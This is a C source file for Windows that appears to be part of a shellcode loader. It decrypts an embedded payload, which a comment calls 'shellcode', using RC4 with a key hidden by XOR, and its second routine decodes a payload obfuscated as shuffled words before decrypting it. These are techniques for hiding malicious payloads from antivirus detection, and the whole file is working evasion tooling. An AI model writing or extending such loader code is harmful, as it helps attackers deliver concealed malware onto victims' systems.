#include <data.h>
#include <decode/decode.h>
#include <crypto/rc_crypt.h>
#include <stdint.h>
#include <stdio.h>
#include <windows.h>
#include <util/util.h>

uint8_t *decrypt_key(const uint8_t *enc, size_t len, size_t *out_len);

unsigned char *decrypted_data = NULL;
size_t decrypted_data_len = 0;

int RC4()
{
  size_t keylen = sizeof(key); // Use sizeof instead of strlen to handle null bytes
  size_t hw_len = sizeof(hw);
  if (decrypted_data)
  {
    free(decrypted_data);
    decrypted_data = NULL;
    decrypted_data_len = 0;
  }

  // Print info about the key as passed from Python
  info("Key from Python (hex):");
  for (size_t i = 0; i < keylen; ++i)
  {
    printf("%02x ", (unsigned char)key[i]);
  }
  printf("\n");

  size_t decrypted_key_len = 0;
  info("Attempting to decrypt key...");
  uint8_t *decrypted_key = decrypt_key((const uint8_t *)key, keylen, &decrypted_key_len);
  if (!decrypted_key)
  {
    warn("Key decryption failed.");
    return -1;
  }

  info("Decrypted key (hex):");
  if (decrypted_key_len == 0)
  {
    warn("Decrypted key has zero length!");
    free(decrypted_key);
    return -1;
  }
  for (size_t i = 0; i < decrypted_key_len; ++i)
  {
    printf("%02x ", decrypted_key[i]);
  }
  printf("\n");

  decrypted_data = malloc(hw_len);
  if (!decrypted_data)
  {
    warn("Memory allocation failed.");
    free(decrypted_key);
    return -1;
  }

  // Decrypt shellcode using RC4 and decrypted key
  // rc4_crypt(decrypted_key, decrypted_key_len, hw, decrypted_data, hw_len);
  if (rc4_crypt(decrypted_key, decrypted_key_len, hw, decrypted_data, hw_len) != 0)
  {
    warn("RC4 decryption failed.");
    free(decrypted_key);
    free(decrypted_data);
    decrypted_data = NULL;
    return -1;
  }
  decrypted_data_len = hw_len;
  free(decrypted_key);

  okay("RC4 RC4 decryption successful. Decrypted %zu bytes.", decrypted_data_len);
  return 0;
}

int words()
{
  const char *encoded = hw;

  // Create and initialize the shuffled array
  const char *shuffled[256];
  for (size_t i = 0; i < BASE_WORDS_COUNT && i < 256; i++)
  {
    shuffled[i] = base_words[i];
  }

  // Shuffle using seed
  shuffle(shuffled, BASE_WORDS_COUNT, seed);

  // Prepare output buffer with safety margin
  size_t estimated_word_count = count_words(encoded);
  size_t estimated_output_size = estimated_word_count + 1024; // Add safety margin
  info("Estimated word count: %zu, buffer size: %zu", estimated_word_count, estimated_output_size);
  uint8_t *output = malloc(estimated_output_size);
  if (!output)
  {
    warn("Memory allocation failed for output buffer.");
    return -1;
  }
  size_t out_len = 0;
  decode(encoded, shuffled, BASE_WORDS_COUNT, output, &out_len, estimated_output_size);
  if (decrypted_data)
  {
    free(decrypted_data);
    decrypted_data = NULL;
    decrypted_data_len = 0;
  }
  decrypted_data = malloc(out_len);
  if (!decrypted_data)
  {
    warn("Memory allocation failed.");
    free(output);
    return -1;
  }
  size_t keylen = sizeof(key);
  info("Encrypted key (hex):");
  for (size_t i = 0; i < keylen; ++i)
  {
    printf("%02x ", (unsigned char)key[i]);
  }
  printf("\n");
  size_t decrypted_key_len = 0;
  info("Attempting to decrypt key...");
  uint8_t *decrypted_key = decrypt_key((const uint8_t *)key, keylen, &decrypted_key_len);
  if (!decrypted_key)
  {
    warn("Key decryption failed.");
    free(output);
    return -1;
  }
  info("Decrypted key (hex):");
  if (decrypted_key_len == 0)
  {
    warn("Decrypted key has zero length!");
    free(decrypted_key);
    free(output);
    return -1;
  }
  for (size_t i = 0; i < decrypted_key_len; ++i)
  {
    printf("%02x ", decrypted_key[i]);
  }
  printf("\n");
  info("Decrypted key in ascii:");
  for (size_t i = 0; i < decrypted_key_len; ++i)
  {
    printf("%c", decrypted_key[i]);
  }
  printf("\n");

  if (rc4_crypt(decrypted_key, decrypted_key_len, output, decrypted_data, out_len) != 0)
  {
    warn("RC4 decryption failed.");
    free(decrypted_key);
    free(decrypted_data);
    free(output);
    decrypted_data = NULL;
    return -1;
  }
  decrypted_data_len = out_len;
  free(decrypted_key);
  free(output);

  okay("Word-based RC4 decryption successful. Decrypted %zu bytes.", decrypted_data_len);
  return 0;
}

uint8_t *decrypt_key(const uint8_t *enc, size_t len, size_t *out_len)
{
  info("Brute-forcing key decryption...");
  if (len < 2)
  {
    warn("Encrypted key too short (length: %zu)", len);
    return NULL;
  }

  uint8_t hint = enc[0];
  uint8_t *decrypted = NULL;
  info("Hint byte: %02X", hint);

  for (int i = 0; i < 256; ++i)
  {
    uint8_t xor_candidate = (uint8_t)i;

    if ((enc[1] ^ xor_candidate) == hint)
    {
      // Found the correct XOR key
      size_t real_len = len - 2; // Remove hint and encrypted hint
      decrypted = malloc(real_len);
      if (!decrypted)
      {
        warn("Memory allocation failed for decrypted key");
        return NULL;
      }

      for (size_t j = 0; j < real_len; ++j)
      {
        decrypted[j] = enc[j + 2] ^ xor_candidate;
      }

      if (out_len)
        *out_len = real_len;
      okay("Decrypted key with hint %02X, XOR key: %02X, length: %zu", hint, xor_candidate, real_len);
      break;
    }
  }

  if (!decrypted)
  {
    warn("Failed to find valid XOR key for hint %02X", hint);
  }

  return decrypted;
}